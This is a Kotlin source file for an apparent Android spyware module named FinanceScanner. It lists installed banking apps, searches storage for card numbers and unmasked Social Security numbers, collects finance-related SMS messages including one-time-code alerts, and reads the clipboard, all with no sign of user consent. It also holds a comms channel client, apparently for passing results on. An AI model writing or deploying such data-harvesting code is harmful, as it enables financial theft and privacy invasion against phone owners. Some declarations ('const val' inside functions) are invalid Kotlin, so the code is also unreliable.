// ============================================================
// FILE: android/app/src/main/java/com/xrc/crypto/FinanceScanner.kt
// ============================================================
package com.xrc.crypto

import android.content.Context
import android.util.Log
import com.xrc.comms.ChannelClient
import com.xrc.comms.Message
import com.xrc.comms.Protocol
import com.xrc.core.crypto.Identity
import java.io.File

/**
 * FinanceScanner — detects financial accounts and sensitive data.
 *
 * Searches for:
 * - Credit card numbers (PAN)
 * - Bank account numbers
 * - Routing numbers
 * - SSN / tax IDs
 * - Login credentials for banking apps
 * - Credit card CVV codes
 * - API keys and tokens
 */
class FinanceScanner(
    private val context: Context,
    private val channelClient: ChannelClient
) {
    companion object {
        private const val TAG = "FinanceScanner"

        // Credit card regex (major issuers)
        private val CREDIT_CARD = Regex("""\b(?:\d[ -]*?){13,16}\b""")

        // SSN regex
        private val SSN = Regex("""\b\d{3}-\d{2}-\d{4}\b""")

        // API key patterns
        private val API_KEY = Regex("""\b([a-zA-Z0-9_\-]{20,60})\b""")

        // Bank account (basic pattern)
        private val BANK_ACCOUNT = Regex("""\b\d{8,17}\b""")

        // Known financial app packages
        val FINANCE_APPS = setOf(
            "com.chase.sig.android", "com.usbank", "com.wf.wellsfargo",
            "com.bankofamerica", "com.citi.mobile", "com.capitalone.mobile",
            "com.paypal.android.sdk", "com.venmo", "com.squareup.cash",
            "com.robinhood.android", "com.webull.android", "com.etoro.trading",
            "com.schwab.mobile", "com.fidelity.fidelite.app", "com.vanguard",
            "com.amip.prod", "com.discoverfinancial.mobile",
            "com.jointhegrid", "com.dave", "com.earnin.app",
            "com.empower.mobile", "com.goprism", "com.clarity.mobile"
        )
    }

    /**
     * Scan all sources for financial data.
     */
    fun scanAll(): List<Map<String, Any>> {
        val results = mutableListOf<Map<String, Any>>()
        results.addAll(detectFinanceApps())
        results.addAll(scanFileSystem())
        results.addAll(scanSms())
        results.addAll(scanClipboard())
        return results
    }

    /**
     * Detect installed finance/banking apps.
     */
    fun detectFinanceApps(): List<Map<String, Any>> {
        val apps = mutableListOf<Map<String, Any>>()
        val pm = context.packageManager

        for (pkg in FINANCE_APPS) {
            try {
                pm.getPackageInfo(pkg, 0)
                val appInfo = pm.getApplicationInfo(pkg, 0)
                val name = pm.getApplicationLabel(appInfo).toString()
                apps.add(mapOf(
                    "type" to "finance_app",
                    "package" to pkg,
                    "name" to name
                ))
            } catch (e: Exception) {
                // Not installed
            }
        }
        return apps
    }

    /**
     * Scan filesystem for financial data.
     */
    fun scanFileSystem(): List<Map<String, Any>> {
        const val MAX_FILE_SIZE = 50000L
        val results = mutableListOf<Map<String, Any>>()
        try {
            val targets = listOf(
                "/storage/emulated/0/Documents",
                "/storage/emulated/0/Download",
                "/storage/emulated/0/Screenshots"
            )
            for (path in targets) {
                val dir = File(path)
                if (!dir.exists()) continue
                dir.walkTopDown().forEach { file ->
                    if (file.isFile && file.length() < MAX_FILE_SIZE && file.length() > 0) {
                        try {
                            val content = file.readText()
                            // Scan for credit cards
                            for (match in CREDIT_CARD.findAll(content)) {
                                if (isValidCardNumber(match.value)) {
                                    results.add(mapOf(
                                        "type" to "credit_card",
                                        "data" to maskCard(match.value),
                                        "source" to file.absolutePath
                                    ))
                                }
                            }
                            // Scan for SSNs
                            for (match in SSN.findAll(content)) {
                                results.add(mapOf(
                                    "type" to "ssn",
                                    "data" to match.value,
                                    "source" to file.absolutePath
                                ))
                            }
                        } catch (e: Exception) {}
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "File system scan: ${e.message}")
        }
        return results
    }

    /**
     * Scan SMS for financial data (OTPs, alerts).
     */
    fun scanSms(): List<Map<String, Any>> {
        const val FINANCE_KEYWORDS = arrayOf(
            "chase", "bank", "citi", "wells fargo", "capital one",
            "paypal", "venmo", "cash app", "zelle", "transfer",
            "deposit", "withdrawal", "balance", "payment",
            "transaction", "purchase", "refund", "credit",
            "debit", "account", "routing", "statement"
        )
        val results = mutableListOf<Map<String, Any>>()
        try {
            val uri = android.net.Uri.parse("content://sms/inbox")
            val cursor = context.contentResolver.query(
                uri, arrayOf("_id", "address", "body", "date"),
                null, null, "date DESC LIMIT 500"
            )
            cursor?.use { c ->
                while (c.moveToNext()) {
                    val body = c.getString(c.getColumnIndexOrThrow("body")) ?: continue
                    val lowerBody = body.lowercase()
                    if (FINANCE_KEYWORDS.any { lowerBody.contains(it) }) {
                        results.add(mapOf(
                            "type" to "finance_sms",
                            "address" to c.getString(c.getColumnIndexOrThrow("address")),
                            "body" to body.take(200),
                            "date" to c.getLong(c.getColumnIndexOrThrow("date"))
                        ))
                    }
                }
            }
        } catch (e: Exception) {}
        return results
    }

    /**
     * Scan clipboard for financial data.
     */
    fun scanClipboard(): List<Map<String, Any>> {
        val results = mutableListOf<Map<String, Any>>()
        try {
            val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            val clip = cm.primaryClip
            if (clip != null && clip.itemCount > 0) {
                val text = clip.getItemAt(0).text?.toString() ?: return results
                for (match in CREDIT_CARD.findAll(text)) {
                    if (isValidCardNumber(match.value)) {
                        results.add(mapOf(
                            "type" to "credit_card_clipboard",
                            "data" to maskCard(match.value)
                        ))
                    }
                }
            }
        } catch (e: Exception) {}
        return results
    }

    /**
     * Validate credit card number using Luhn algorithm.
     */
    private fun isValidCardNumber(number: String): Boolean {
        val digits = number.filter { it.isDigit() }
        if (digits.length < 13 || digits.length > 19) return false
        
        var sum = 0
        var alternate = false
        for (i in digits.length - 1 downTo 0) {
            var n = digits[i].digitToInt()
            if (alternate) {
                n *= 2
                if (n > 9) n -= 9
            }
            sum += n
            alternate = !alternate
        }
        return sum % 10 == 0
    }

    private fun maskCard(card: String): String {
        val digits = card.filter { it.isDigit() }
        return "****${digits.takeLast(4)}"
    }
}
